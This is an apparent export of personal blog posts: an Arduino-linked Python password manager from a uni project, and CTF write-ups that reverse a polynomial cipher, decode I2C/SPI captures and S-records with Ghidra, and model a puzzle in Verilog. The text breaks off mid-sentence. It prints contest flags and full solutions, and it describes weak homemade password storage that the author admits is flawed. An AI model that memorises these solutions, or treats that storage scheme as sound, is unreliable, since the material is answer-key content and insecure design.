[{"contents":" If you see this (without inspecting source), video tags don't seem to work on your browser mate.  Introduction I\u0026rsquo;ll be introducing a roughly two week project that I worked on with two other group mates for a uni subject. The theme we were given was to build something that makes our home smarter or more fun. As a team, we started off with the idea of a password manager and decided to add some small fun elements, that would make this password manager the most fun password manager out there (hopefully). This page will talk about the technical side of the password manager system itself in more detail than the video, as well as a bit about editing (with a tiny bit of animating) a video.\nLink to Github repo The Manager The prompt itself was very open ended, however we needed to use the Arduino (and some accompanying sensors) to create something fun. In the end, we came up with a password manager that uses Python, which interfaces with the Arduino for some extra functions.\nPython Despite my questionable coding habits, I was in charge of the entire Python side of the system, due to me being the one with the most experience with it.\nInitially I had planned on letting all the user interaction happen via an LCD display connected to the Arduino, and let the Python side of things be controlled through terminal only. However, I was inspired by a workshop/project from the same uni subject where I built a simple GUI in MATLAB. What this MATLAB app did was control the angle of a servo, on which there was a range finder which sent distance readings to be plotted on MATLAB. This was all made entirely possible thanks to a serial connection between MATLAB and Arduino (where the servo and range finder were connected).\nAs fun of a challenge using MATLAB for this system would be, I think I\u0026rsquo;ve had enough MATLAB for one year. So using the serial connection idea, it was possible to let the Python code communicate with Arduino with pySerial , a python module. In terms of designing and making a GUI, there are plenty of libraries to choose from (such as tkinter , wxPython and PyQT just to name a few). I ended up choosing PySimpleGUI mainly because I was promised an easy and quick way to code up a GUI.\nGUI Since the Arduino has no way to store passwords (that I\u0026rsquo;m aware of), all the passwords will have to be stored onto the computer that\u0026rsquo;s running the Python code. To do that, it will read and write all the details onto a text file, saved in the same directory as the Python code. If a non-empty password file doesn\u0026rsquo;t exist in the same directory, it will bring the user to a sign up screen, where they\u0026rsquo;ll be prompted to create a master password. If a non-empty password file already exists, or the user has finished setting a master password, they\u0026rsquo;ll be taken to a login page (I was clearly too lazy to fix up the login message).\nOnce successfully logged in, the user will be brought to the home page, where all their accounts and passwords are stored.\nBy clicking \u0026ldquo;New password\u0026rdquo;, the user will be introduced to an additional screen where they are able to add a new account password combination. The user is able to enter a password of their own choosing, or use the generate password button to automatically generate one for them. Even after generating a random password, the password can still be edited.\nThe user is also able to see passwords of all their accounts, copy a password to their clipboard, or delete an entry. The Random Password Generator Now to reveal the magic behind the \u0026ldquo;Generate password\u0026rdquo; button. When the button is clicked, the Python code will request a number from the Arduino (more details on how that number is generated later).\nThis number is fed into the urandom function from Python\u0026rsquo;s os module. What this outputs is a very random (technically not truly random, but that\u0026rsquo;s a topic for computer science to handle) sequence of bytes, whose size is determined by the number given by the Arduino.\nThe result is then fed into random.seed(), which will act as the seed to generate a large integer within a certain range.\nThe large integer that gets generated will get its digits split into groups of 2, where each group will represent one character of the password. Then, a book cipher-like decoding will occur, where the alphabet is all ascii letters (A-Z and a-z, from string module\u0026rsquo;s ascii_letters), all numerical digits (0-9, from string module\u0026rsquo;s digits), and select punctuation (!@#$%^\u0026amp;*). This choice is somewhat arbitrary. Since there needs to be 100 characters in the password alphabet (groups of two numbers range from 00-99), the numerical digits were repeated 3 additional times in order to pad the password alphabet. This choice was absolutely very arbitrary.\nStoring Passwords Just to add a tiny bit of security, the passwords themselves are not stored as plain text in a file, but rather as the encoding of it (using the password alphabet described above). All passwords (whether generated or entered manually by the user), are encoded when the \u0026ldquo;Create\u0026rdquo; button is clicked.\nThe master password on the other hand is stored differently. It is hashed using sha256 courtesy of the hashlib module, and every password entered into login is checked against this hash.\nArduino The features on the Arduino were handled by my group mates, but here\u0026rsquo;s an explanation of what happens.\nThe Sensors To generate a number that then becomes the seed to the random number generator in Python, there are two separate voltage divider circuits, involving a photoresistor and a thermistor. Both of these are special types of resistors, and their resistance changes according to the brightness and temperature of its surroundings respectively. The Arduino measures the voltage across the photoresistor/thermistor, and returns a number between 0-1023, due to how the Arduino reads in the analog values . These two numbers then get added together, and are sent through serial back to Python.\nThe LCD There is an LCD that acts as part of a visual display of success/failure. When a password has successfully been created (i.e. when the create button is clicked on the GUI), the LCD will display \u0026ldquo;PW GEN Success\u0026rdquo;, along with the password that had been created. On failure, it will display \u0026ldquo;PW GEN FAIL\u0026rdquo;.\nThe RGB LED To make this password manager system truly epic gamer friendly, there is a single RGB LED. When the password is successfully created, the RGB will randomly change colour every half a second. If password creation has failed, the RGB will stay red.\nThe Active Buzzer The sweet tunes promised in the video comes from this buzzer. However, I was very misleading in the video, as Darude - Sandstorm is never played when the system is in use. Instead, on a successful creation of a password, a simple melody will be played. On the other hand, if the password create fails, an angry sounding tone will play instead.\nThe Servo In order to control the candy monster shown in the video, there is a servo that opens/closes the mouth. Upon successful creation of the password, the mouth will open, and the user is free to grab whatever candy they like. The box will close when a request to generate a new password has been made.\nFlaws and Possible Improvements There are no doubts a ton of flaws with the system, and plenty of ways to improve the system. Here are some I\u0026rsquo;ve thought of:\n The Python code may contain a lot of bugs, as I spent a solid chunk of time discovering and patching some bugs. The Python logic could also be a lot simpler as well, for example, the delete function has to read, delete the contents of the file, then rewrite the entire password file. Whilst it works, its inefficiency hurts a little. Currently, the code can only generate passwords that are 8 characters long. It does this by forcing the randint function to generate a number between 1000000000000000 and 9999999999999999. This means that numbers less than 1000000000000000 cannot be generated, leaving a lot of potential passwords unable to be generated. It can also be extended to create a password of any (reasonable) length specified by the user.  Instead of this weird cipher way of generating the password, the randint function could instead be called n number of times, where each call generates one character of the password, and when storing/retrieving the password, the encoding/decoding can be used instead.   Both the Arduino and Python code could be cleaned up to look less like a giant messy chunk of code. At the moment, Python sends a 1 to Arduino if it wants to request a random number. If for some insane reason, someone decides to have 1 as their password, the system will not behave as expected. The password manager GUI could do with additional features, such as editing an existing password, or even changing the master password. Someone with more design talent than I could also make the user interface a lot better.  The Video Now, within the two weeks we had to get this project done, my group mates and I also needed to make a video for the subject. Being the only one in the group who felt confident enough to edit videos, I was tasked with being the de facto editor and director for the group. This was a role I was definitely not prepared for one bit. I had previously used Adobe After Effects to do some video editing (and a ton of animating mouths moving), but that was 5 years ago, and using a high school license. After some experimenting with free, open source alternatives, I settled on Shotcut , due to its decent performance on my computer, and had most of the features that I wanted (that required lots of looking up tutorials for).\nThe Visuals Thankfully, my group mates were able to provide visuals for parts of the video. The entire material and demonstration section just required some slicing and piecing pieces together, and the intro just needed additional editing touches. However, the real struggle lay in the parts in between: the dialogue, and my short technical explanation.\nNo one really had any idea what to put on top of these, hell, I didn\u0026rsquo;t even know how I wanted my explanation parts to look like. Eventually I settled with doing some really basic drawings and animations, for better or for worse.\nAll drawings were drawn using FireAlpaca mostly because it was something I already had installed on my computer, and it sure beats MS paint. It also has onion skin view, which helps with animating. I initially wanted to use OpenToonz or Pencil2D for a better time doing lip syncing animations, but both these applications seemed to hate my drawing tablet. Hence, I resorted to drawing each frame in FireAlpaca, and manually stitching them together with Shotcut. Visual Inspiration and References Lip syncing: The video that got me into drawing mouths that move The arm-less stick figures: My drawing talent (arms are overrated anyway)\nThe better looking stick figures: 1 , 2 , 3 The Audio The audio was the part that received the least attention, as it mainly involved dragging and dropping the audio files into the editor, with minor changes to volume, and perhaps the occasional fade in/out. Music was pulled from copyright free music sites (except for Sandstorm).\nThe Struggles My computer is in no way designed to edit videos, and editing a video with several hundreds of files (mostly due to lip syncing images) using Shotcut definitely slowed down the entire editing process down.\nAlthough my memory usage hovered around 80-90%, and CPU varied between 50-70%, towards the end of the editing process, thankfully, the only thing that was slow to respond was Shotcut. The rest of the computer could function perfectly normally. Shockingly, Shotcut only crashed unexpectedly twice over the period of editing the video! For comparison, 5 years ago, Adobe After Effects would crash upwards of 10 times a day for me.\nA limitation we had to have with the video, was its length. A requirement for the video was for it to be 5 minutes (+/- 30 seconds). Keeping the video within the time constraint meant that a lot of more detailed explanations had to be cut out (and is partially why this entire write up exists).\nConclusion Would I ever use this system myself? Probably not, however it was a ton of fun to make. But name a more fun password manager, that not only offers the lights, beats, and candy like this system, but also has a fun 5 minute video to accompany it?\n","date":"2021-10-25","description":"Ever wished that you could have a password manager that not only managed your passwords, but played music and gave you treats? Well I know I haven't, but as a group project for uni, I and some group mates decided to fulfill this exact desire. This post features some details about the python + arduino password manager, as well as a reflection on making and editing a video to present it","permalink":"https://anniequus.com/posts/arduino-password-manager/","title":"The password manager to cure lockdown woes"},{"contents":" Who knew I\u0026rsquo;d be writing a crypto writeup.\nThe Beginning The challenge provides a SageMath bit of code, as well as a cipher text.\ndef encrypt(msg, f): return \u0026#39;\u0026#39;.join(chr(f.substitute(c)) for c in msg) P.\u0026lt;x\u0026gt; = PolynomialRing(ZZ) f = 13*x^2 + 3*x + 7 FLAG = open(\u0026#39;./flag.txt\u0026#39;, \u0026#39;rb\u0026#39;).read().strip() enc = encrypt(FLAG, f) print(enc)  That\u0026rsquo;s some messy looking cipher text\u0026hellip;\nUnderstanding the sage Thankfully the SageMath here is nice and short. All that we need to know, is that each character of the flag is thrown into the encryption function f. So to reverse it, we just do the opposite.\nSince the values were obtained by substituting each character into 13*x^2 + 3*x + 7, to get x back, we solve 13*x^2 + 3*x + 7 = \u0026lt;encrypted num\u0026gt;.\nNeat-ify the cipher text Those bytes looked a little unpleasant to me, so I decided to turn them into their appropriate unicode values.\ntxt = open(\u0026#34;output.txt\u0026#34;).read() nums = [] for chr in txt: nums.append(ord(chr)) print(nums) nums = [60323, 94187, 58565, 91987, 63917, 197053, 172277, 140927, 30103, 178315, 151963, 130307, 19897, 181373, 33973, 117617, 178315, 172277, 33973, 130307, 117617, 169297, 30103, 175283, 117617, 31367, 33973, 203507, 10]\nNow that\u0026rsquo;s much better. Now to simply reverse the values and \u0026hellip;\nOh no An unnatural call I then felt a disturbance in the air. My computer was absorbed by a bright, blinding light. When my senses recovered I saw this: I guess I have no choice now. The call of engineers can not be ignored.\nAn unholy solve Matlab thankfully has a very simple way of solving quadratic equations. Using the root() function, in addition to rounding, I summoned the following code:\nnums = [60323, 94187, 58565, 91987, 63917, 197053, 172277, 140927, 30103, 178315, 151963, 130307, 19897, 181373, 33973, 117617, 178315, 172277, 33973, 130307, 117617, 169297, 30103, 175283, 117617, 31367, 33973, 203507, 10]; results = \u0026#34;\u0026#34;; for i = 1:length(nums) results(i) = char(round(max(roots([13 3 (7-nums(i))])))); end sprintf(\u0026#34;%s\u0026#34;,results) And just like that, the blinding light disappeared, and a flag emerged\u0026hellip; DUCTF{sh0uld'v3_us3d_r0t_13}\nWhat have I done\u0026hellip;\n","date":"2021-09-26","description":"The road to becoming a crypto master is a fun journey, but still no easy feat. So, I decided to begin this journey by doing a challenge from DUCTF 2021 called \"Substitution Cipher I\", using a tool few people have used to solve crypto challenges, despite it almost having \"maths\" in its name","permalink":"https://anniequus.com/posts/sub1-ductf2021/","title":"Path to a crypto master, the engineer way"},{"contents":" A mildly interesting challenge that touches (very briefly) on serial communication. But given that the files are .sal files, we can use the trusty old Saleae\u0026rsquo;s logic analyser to help decode everything.\nTL;DR: Use Saleae to extract information, be reminded that Motorola exists and created S-records, break the information down, use Ghidra to disassemble and decompile the machine code, and make sense of everything to eventually obtain the flag.\nIntroduction The challenge gives us two .sal files, and based solely on the challenge description, capture.sal gives us a function block, and key.sal gives us a key of some kind. This seems pretty straight forward, so time to get on extracting.\nExtraction key.sal First, we\u0026rsquo;ll take a look at key.sal, and see what we can get.\nThere are only two channels to look at, and given that one channel (channel 0 in white) seems to have pretty consistent rises and falls, it\u0026rsquo;s safe to say that this is the clock. Leaving channel 1 (the orange channel) to be the data channel we need to collect. Thankfully, figuring out which protocol could be used isn\u0026rsquo;t too difficult given this information, and just a casual click through all the possible analysers Saleae provides, leads us to I2C being the best candidate for this capture. Here we have assigned our clock (SCL) to channel 0, and data (SDA) to channel 1.\nApplying those settings gives us the the above. Even though it\u0026rsquo;s not strictly necessary to know much/anything about I2C, here\u0026rsquo;s a great diagram from Texas Instruments that matches what we see in the capture. We can see that SCL is broken into groups of 9 periods (rise and fall of the clock), which matches to I2C\u0026rsquo;s 8 bits of data, plus an acknowledge bit (each period of the clock transmits one bit).\nLooking at the output terminal of the analyser, we get the following information:\nread to 0x08 ack data: 0x59 0x57 0x72 0x31 0x79 0xCE 0x94 0x8D 0x15 0xD4 0x54 0x02 0x7C 0x5C 0xA0 0x83 0x3D 0xAC 0xB7 0x2A 0x17 0x67 0x76 0x38 0x98 0x8F 0x69 0xE8 0xD0\nSince there isn\u0026rsquo;t anything that can be done to these hex strings, it\u0026rsquo;s probably safe to assume that\u0026rsquo;s all for now regarding key.sal - onwards to capture.sal!\ncapture.sal  Giving the capture a look, there are clearly two blocks of information being sent. Since this capture uses the same number of channels, and each channel has the same behaviour across the two blocks, it\u0026rsquo;s safe to assume the same protocol is being used within this capture. Given that there are more than 2 channels, we can rule out I2C. We just need a closer look at what\u0026rsquo;s going on in each channel.\nUpon closer inspection, we can see a good amount of squiggly lines. Just from the image alone, we can see that channel 0 is probably a clock, channel 1 is some enable line (active low), channel 3 is data, and channel 2 is dead to us. Now some amount of scrolling through Saleae\u0026rsquo;s logic analyser will lead us to SPI.\nBased on the information we do have, we can plug them into the settings for SPI. Again, knowing SPI in detail is not necessary, but a here\u0026#39;s a great video on the basics of SPI.\nTaking a look at the analyser\u0026rsquo;s output table, we can see that the data (miso in my case) seems quite ASCII like. There are many useless facts stored in my brain, and knowing that 0x30-0x39 represents numbers 0-9 is one of them. So converting all the hex to ASCII output, gives us the following:\nBlock 1:\nS00C00004C6F63616C204B6579BF S221020018423B165105BDAAFF27DB3B5D223497EA549FDC4D27330808F7F95D95B0EC S5030001FB Block 2:\nS0210000506F77657250432042696720456E6469616E2033322D42697420537475620E S12304EC9421FFD093E1002C7C3F0B78907F000C909F000839200000913F001C4800012C7E S123050C813F001C552907FE2F890000409E0058813F001C815F000C7D2A4A1489290000FF S123052C7D2A07743D20100281090018813F001C7D284A14892900003929FFFD5529063EC7 S123054C7D2907747D494A787D280774813F001C815F00087D2A4A14550A063E9949000074 S123056C480000BC815F001C3D205555612955567D0A48967D49FE707D2940501D29000317 S123058C7D2950502F890000409E0058813F001C815F000C7D2A4A14892900007D2A077476 S12305AC3D20100281090018813F001C7D284A1489290000392900055529063E7D2907743F S12305CC7D494A787D280774813F001C815F00087D2A4A14550A063E99490000480000408D S12305EC813F001C815F000C7D2A4A14890900003D20100281490018813F001C7D2A4A145A S123060C89490000813F001C80FF00087D274A147D0A5278554A063E99490000813F001CA1 S123062C39290001913F001C813F001C2F89001C409DFED0813F00083929001D3940000040 S11B064C9949000060000000397F003083EBFFFC7D615B784E80002060 S503000CF0 What in the world are all these S\u0026rsquo;s This looks very similar to Intel\u0026#39;s hex format (.hex files), which essentially allows for machine code to be written into a chip\u0026rsquo;s ROM. However, instead of semicolons, there are S\u0026rsquo;s in this case, which is very much not Intel hex-like. This calls for a round of intense searching.\nResearch Whip out the keyboard, it\u0026rsquo;s time to search the internet for what these two blocks really are. Searching up s instead of semicolon hex file gives a couple sites mentioning \u0026ldquo;S-records\u0026rdquo;, which is very promising. However, if you\u0026rsquo;re feeling efficient, S hex files will present the wikipedia page for S-records (originally created by Motorola!). Taking a look at SREC confirms that we\u0026rsquo;ve hit the jackpot. After spending quite a bit of time reminiscing about some great old Motorola phones , we can wipe off that sweat from the heavy round of researching, because now we\u0026rsquo;ll apply our new found knowledge to the two blocks.\nApply  Based on the record structure shown, we can break each block into the appropriate records, and work from there:\nBlock 1:    S Type Byte Count Address Data Checksum     S 0 0C 0000 4C6F63616C204B6579 BF   S 2 21 020018 423B165105BDAAFF27DB3B5D223497EA549FDC4D27330808F7F95D95B0 EC   S 5 03 \u0026mdash; 0001 FB    Block 2:    S Type Byte Count Address Data Checksum     S 0 21 0000 506F77657250432042696720456E6469616E2033322D4269742053747562 0E   S 1 23 04EC 9421FFD093E1002C7C3F0B78907F000C909F000839200000913F001C4800012C 7E   S 1 23 050C 813F001C552907FE2F890000409E0058813F001C815F000C7D2A4A1489290000 FF   S 1 23 052C 7D2A07743D20100281090018813F001C7D284A14892900003929FFFD5529063E C7   S 1 23 054C 7D2907747D494A787D280774813F001C815F00087D2A4A14550A063E99490000 74   S 1 23 056C 480000BC815F001C3D205555612955567D0A48967D49FE707D2940501D290003 17   S 1 23 058C 7D2950502F890000409E0058813F001C815F000C7D2A4A14892900007D2A0774 76   S 1 23 05AC 3D20100281090018813F001C7D284A1489290000392900055529063E7D290774 3F   S 1 23 05CC 7D494A787D280774813F001C815F00087D2A4A14550A063E9949000048000040 8D   S 1 23 05EC 813F001C815F000C7D2A4A14890900003D20100281490018813F001C7D2A4A14 5A   S 1 23 060C 89490000813F001C80FF00087D274A147D0A5278554A063E99490000813F001C A1   S 1 23 062C 39290001913F001C813F001C2F89001C409DFED0813F00083929001D39400000 40   S 1 1B 064C 9949000060000000397F003083EBFFFC7D615B784E800020 60   S 5 03 \u0026mdash; 000C F0    Now to analyse what each record means. Thankfully it\u0026rsquo;s quite simple:\n S5 we can just ignore, since it only tells us how many S1/2/3 records there are (basically number of data records). As mentioned above, S1 and S2 are data records, the only difference is that S2\u0026rsquo;s address size is 6 bytes. S0 is very helpful, as they\u0026rsquo;re header records. It tells us information about each block. Given that each S0 record\u0026rsquo;s data field looks very ASCII like, let\u0026rsquo;s decode:  Block 1: Local Key Block 2: PowerPC Big Endian 32-Bit Stub    Very intriguing. There seems to be another key (that\u0026rsquo;s separate to the key we got from key.sal), so we\u0026rsquo;ll set that aside and take a look at block 2. It looks like there\u0026rsquo;ll be at least a little PowerPC fun! Good thing I know a creature that knows PowerPC.\nThe programming-y bits Loading up Ghidra Now, reversing the hex codes to the appropriate machine code instructions by hand would be, to put it simply, complete insanity. Luckily Ghidra can help with not just the disassembly, but also the decompilation. This allows us to deal with PowerPC with little to no PowerPC knowledge.\nGiven that I know basically nothing about PowerPC, the decompiler thankfully gives plenty of information as to what\u0026rsquo;s going on (I\u0026rsquo;ve changed some variable names):\nvoid UndefinedFunction_00000000(int param_1,int param_2) { uint index; for (index = 0; (int)index \u0026lt; 0x1d; index = index + 1) { if ((index \u0026amp; 1) == 0) { *(byte *)(param_2 + index) = *(byte *)(param_1 + index) ^ *(char *)(local_key + index) - 3U; } else { if ((int)index % 3 == 0) { *(byte *)(param_2 + index) = *(byte *)(param_1 + index) ^ *(char *)(local_key + index) + 5U; } else { *(byte *)(param_2 + index) = *(byte *)(param_1 + index) ^ *(byte *)(local_key + index); } } } *(undefined *)(param_2 + 0x1d) = 0; return; } Taking a look at this, it seems to XOR (^) each byte of param_1 against the local key (with some small adding/subtracting depending on the index) and stores it in param_2. Clearly, param_1 is where the key from key.sal comes in and param_2 should hopefully be the flag.\nTrust the python All that needs to be done is to plug the keys into the C code and hopefully get the flag. But for whatever reason, my brain decided it wanted to work with snakes instead.\nkey = [0x59, 0x57, 0x72, 0x31, 0x79, 0xCE, 0x94, 0x8D, 0x15, 0xD4, 0x54, 0x02, 0x7C, 0x5C, 0xA0, 0x83, 0x3D, 0xAC, 0xB7, 0x2A, 0x17, 0x67, 0x76, 0x38, 0x98, 0x8F, 0x69, 0xE8, 0xD0] local = [0x42, 0x3B, 0x16, 0x51, 0x05, 0xBD, 0xAA, 0xFF, 0x27, 0xDB, 0x3B, 0x5D, 0x22, 0x34, 0x97, 0xEA, 0x54, 0x9F, 0xDC, 0x4D, 0x27, 0x33, 0x08, 0x08, 0xF7, 0xF9, 0x5D, 0x95, 0xB0] flag = \u0026#34;\u0026#34; for i in range(29): if (i \u0026amp; 1) == 0: flag += chr((key[i] ^ local[i]-3)) elif (i % 3) == 0: flag += chr((key[i] ^ local[i]+5)) else: flag += chr(key[i] ^ local[i]) print(flag) In the end, we finally get the flag we\u0026rsquo;re after!\nFlag: flag{s3r14l_ch4ll3ng3_s0lv3r} ","date":"2021-09-21","description":"Read about bits being analysed and Motorola being remembered, this is a writeup on a serial challenge titled \"A different Type of Serial Key\" from CSAW CTF 2021","permalink":"https://anniequus.com/posts/csaw2021-serial/","title":"\"Oh yeah Motorola exists\" - Revelations made in CSAW CTF 2021"},{"contents":" I unfortunately did not solve this during the competition period, but mildly obsessed over this for about a week after the competition. Here\u0026rsquo;s how I lost way too many hours of sleep.\nTL;DR - Realise this was all just one big digital logic circuit, recognise the different logic gates and connections, build it all in Verilog, solve with some ModelSim bruteforcing, and get enough sleep.\nIntroduction The challenge provides us with a zip file containing a python script that takes in some data (level1 / level2) to build the challenge. run.sh just serves as an easy way to progress from level1 to level2.\nLevel 1  Well this doesn\u0026rsquo;t seem too bad\u0026hellip; We\u0026rsquo;re told (in the command line) that the goal is to simply move the red car from its original position, and the green block will encode the flag. Just shift the blocks around and it\u0026rsquo;s as simple as that. Bring on level 2!\nLevel 2  Well\u0026hellip; I can almost see my life flashing before my eyes. Solving this through the matplotlib graph it creates would be a pain (especially given that it took about a minute for matplotlib to load the graph itself). Clearly, we need to analyse how it\u0026rsquo;s getting the map.\nAnalysis Let\u0026rsquo;s take a look at the game.py script first.\nA quick skim through the code reveals that it parses the data determined by the level1/level2 file, builds the world\u0026rsquo;s worst carpark, and allows for the user to click to move cars. There are a few important things to note:\n First, the red block has \u0026ldquo;movable\u0026rdquo; attribute as -2, and if the script detects that the block has moved from its original position, the printflag() command is called. Second, it adds the cars that have \u0026ldquo;moveable\u0026rdquo; attribute equal to -1 to a flagblocks array. These cars are the green blocks that encode the flag (in binary). On top of that, the each car represents each bit of the flag, and is determined by whether the car has to move from its original position (moved = 1, otherwise 0). And finally, the bits of the flag are separated into bytes (8 bits) and reversed before being converted to ASCII and printed.  With all those in mind, we have a good enough overview of what we need to do: Determine which green blocks need to be moved in order for the red block to move.\nNow the hours of \u0026ldquo;fun\u0026rdquo; begin.\nDiving deeper Whilst we have a general idea of how everything works, how in the world do we apply it here? Most importantly, where in the world are the green and red blocks? Doing a quick grep on the level2 file (based on -1 == green block, and -2 == red block), we can see that there are a lot of green blocks (64 in fact) all in a vertical line, and one singular red block in a tiny corner. We know this, as the python script parses the file info as (x,y,w,h,movable). On top of that, the green blocks are added to the flagblocks array from top to bottom, meaning the top most green block represents bit 0, and the bottom most green block represents bit 63.\nTime to zoom in even more! Luckily the python script uses PIL to save the graph as a png, so we won\u0026rsquo;t have to deal with the 10 seconds it takes for matplotlib to zoom in. The scariest thing about this, is that this is only a small section of the whole bigger picture. Anyone hoping to somehow solve this by hand ought to be reported for insanity. Working backwards from the red block, it\u0026rsquo;s clear that the vertical line of grey blocks must move. But we seem to hit a jam where the top circled region is. In order for the grey blocks to move up, the long skinny grey block, as well as the shorter block (inside the circled region) must both move. Looking at this, if we consider the two arrows pointing toward the circle as inputs, and the arrow pointing away from the circle as outputs, this is starting to look like an AND logic gate! We will consider the inputs as whether there\u0026rsquo;s \u0026ldquo;a flow/gap\u0026rdquo; coming in. So if the cars can move then it\u0026rsquo;ll be a 1, otherwise it\u0026rsquo;s 0.\nThis can get confusing, as the gap moves in the opposite direction to the cars, but with enough annotating and imagination, we might be able to figure this one out.\nA step back  Ignoring the questionable colour choices I\u0026rsquo;ve made, if we step back to look at the bigger picture, it\u0026rsquo;s clear there are two types of \u0026ldquo;blocks\u0026rdquo; just repeated over and over. Block A seems to be a 4 input, 2 output block of some sort, and B seems to be a big 4 input, 4 output block. This makes analysis so much easier, as we only need to determine the behaviour of two blocks. So let\u0026rsquo;s get started.\nJunction types But before we jump in on analysing each block, we must first identify all the different types of \u0026ldquo;junctions\u0026rdquo;. These junctions can be a real nuisance, but they help simplify the blocks down to a simple logic gate. Although difficult to determine at first, it\u0026rsquo;s possible to figure out each if we know which way the traffic (gap) flows, and the output behaviour based on different inputs. I\u0026rsquo;ll be giving them random names that are definitely not their official names, but I do like to pretend they form some superhero team (a digital logic version of The Avengers?).\nThe And  Just your regular AND gate.\nTh(e) Or  A proud member of The Avengers. Also happens to be a classic digital logic gate.\nThe Criss Cross  These allow for two wires to cross over each other without affecting each other. In this case, the vertical flow has no effect on the horizontal flow.\nThe Splitter  Takes in one input, and splits it into two: essentially clones an input.\nBlock A  If we let the flow of the gap go from left to right in this image (following the rough direction of the red arrows), we can simplify this block down to a simple logic circuit. As it turns out, the \u0026ldquo;4 inputs\u0026rdquo; can be treated as 2 inputs, as one is always the reverse of the other. Even better, the \u0026ldquo;2 outputs\u0026rdquo; can also be seen as only 1 output, as not(A xor B) is the opposite of A xor B.\nBlock B  The same sort of logic can also be applied to block type B. This block can be modelled as a 2 input, 2 output logic gate, where the top output is not(A xor B) and the bottom is A or B.\nOh yeah, it\u0026rsquo;s all coming together  Now to link all these different blocks together. Based on the above labels (each row is assigned an index between 0 and 63, and each column is a letter between A and G), we have the following connections:\nA: inputs: car, in1 outputs: A[i] B: inputs: A[i-1](1 if i==0), A[i] outputs: B1[i], B2[i] C: inputs: B1[i], C2[i-1]\u0026amp;B2[i-1] (1 if i==0) outputs: C1[i], C2[i] D: inputs: C1[i], C1[i+1] (1 if i==63) outputs: D[i] E: inputs: D[i+1] (D[0] if i==63), in2 outputs: E1[i], E2[i] F: inputs: E1[i], E2[i-1]\u0026amp;F2[i-1] (1 if i==0) outputs: F1[i], F2[i] G: inputs: in3, F1[i] outputs: G[i] Rogue Inputs  There seem to be extra unknown variables in the above connection rules. Clearly car represents the green block inputs, but what are in1, in2, and in3? As it turns out, some blocks have some cheeky external input, as shown in the example above. When modelling the entire circuit, I will only take into account the top of the inputs (in the example above, the top block will have 0 as its extra input, and the bottom block will have 1 as its extra input).\nBuilding with Verilog Very smart CTF professionals would resort to Z3 or any other SMT/SAT solver. So naturally I decided to turn to Verilog instead.\nVerilog is a hardware description language that can be used to model electronic systems. In this case, we can use it to describe the digital circuit we\u0026rsquo;re given, and then hopefully find a way to determine the correct input in order to make that red block move. Given that each block can be modelled as a logic gate, we can treat each block as its own module, where it has 2 inputs, and either one or two outputs.\nmodule lil_xor(input A,B, output out_xor); assign out_xor = (A==B); endmodule module big_boi(input A,B, output out_eq,out_or); assign out_eq = (A==B); assign out_or = A | B; endmodule lil_xor is the 2 input 1 output block (its name is misleading, but let\u0026rsquo;s pretend I named it correctly), and big_boi is the bigger cousin, with 2 inputs and 2 outputs.\nNow to implement all the connections with some Verilog magic.\nmodule parking(input [63:0]in,output [63:0]out); reg [0:63] in1 = 64\u0026#39;b1000010011111100010010101000010010000100111111000100101010000100; reg [0:63] in2 = 64\u0026#39;b0001001100110111000100110011011100010011001101110001001100110111; reg [0:63] in3 = 64\u0026#39;b1010111111011110001100101110101001010101011110100101011100000111; wire [63:0]out1; // starting 64 car blocks - contains fixed input \tgenvar i; generate for (i = 0; i \u0026lt; 64; i=i+1) begin : ricky // invert car input (0 means A = 1, 1 means A = 0) \tlil_xor test(~(in[i]),in1[i],out1[i]); end endgenerate // second block \twire [63:0]out2, out3; generate for (i=0; i \u0026lt; 64; i=i+1) begin : bobby if (i==0) big_boi test(1\u0026#39;b1,out1[i],out2[i],out3[i]); else big_boi test(out1[i-1],out1[i],out2[i],out3[i]); end endgenerate // third block \twire [63:0] out4, out5; generate for (i=0;i\u0026lt;64;i=i+1) begin : robby if (i==0) big_boi test(out2[i],1\u0026#39;b1,out4[i],out5[i]); else big_boi test(out2[i],out5[i-1]\u0026amp;out3[i-1],out4[i],out5[i]); end endgenerate // fourth block \twire [63:0] out6; generate for (i=0;i\u0026lt;64;i=i+1) begin : bibby if (i==63) lil_xor test(out4[i],1\u0026#39;b1,out6[i]); else lil_xor test(out4[i],out4[i+1],out6[i]); end endgenerate // fifth block - contains fixed input \twire [63:0] out7, out8; generate for (i=0;i\u0026lt;64;i=i+1) begin : timmy if (i == 63) big_boi test(out6[0],in2[i], out7[i],out8[i]); else big_boi test(out6[i+1],in2[i],out7[i],out8[i]); end endgenerate // sixth block \twire [63:0] out9, out10; generate for (i=0;i\u0026lt;64;i=i+1) begin : tommy if (i==0) big_boi test(out7[i],1\u0026#39;b1,out9[i],out10[i]); else big_boi test(out7[i],out8[i-1]\u0026amp;out10[i-1],out9[i],out10[i]); end endgenerate // seventh block - contains fixed input \twire [63:0] out11; generate for (i=0;i\u0026lt;64;i=i+1) begin : bob lil_xor test(in3[i], out9[i], out11[i]); end endgenerate assign out = out11; endmodule Et voil√†! This is essentially the Verilog version of the connection equations (where A-G are blocks 1-7 respectively). Just a few strange Verilog things to note:\n [0:63] means the most significant bit (MSB) is bit #0, and least significant bit (LSB) is bit #63, whereas [63:0] means MSB is bit #63, and LSB is bit #0 genvar is like a regular integer in programming languages, but in Verilog, genvar is required so that it can be used to instantiate multiple instances of the same module, because regular integers just aren\u0026rsquo;t good enough for verilog the for loops in generate blocks must be named, so that Verilog (simulators) can differentiate between each instance of the module  obviously ricky, bobby, robby, bibby, timmy, tommy and bob are fantastic names for these    The in1, in2, and in3 were obtained by scrolling through the map and noting down 1\u0026rsquo;s and 0\u0026rsquo;s, whilst simultaneously praying that no mistakes were made during transcription.\nSolving with ModelSim Now comes the part that shouldn\u0026rsquo;t have taken over a week to figure out and get working properly, but did nonetheless.\nComing up with some ideas Idea 1: Use Quartus' RTL viewer to simplify the circuit and give us a solution I had been using Quartus (and hence Verilog + ModelSim) for a semester for uni, so my mind went straight to \u0026ldquo;how can I justify the hours I spent reading Verilog and Quartus documentation\u0026rdquo;. Despite this, I had completely forgotten that Quartus comes with an RTL viewer that essentially gives a high level representation of the digital circuit (i.e. using logic gates). On top of that, it\u0026rsquo;s also smart enough to simplify more complicated circuits. So thanks to a nudge from a Verilog Veteran, I decided to give it a crack.\n Quartus has let me down once again. After many attempts to break the circuit down to allow Quartus to simplify, there was no way for it to give me a small enough circuit to easily solve. Keep in mind, the above image was just page 1 of 3. With Quartus unable to help me with this, I decided to turn to ModelSim.\nModelSim is lovely, in that it simulates Verilog modules given a testbench. It also has a bunch of nice graphical features (waveforms mainly), but we\u0026rsquo;ll probably just stick with the console/terminal outputs for this.\nNow we just need to write a testbench that will solve the problem for us. In this case, we need to determine what 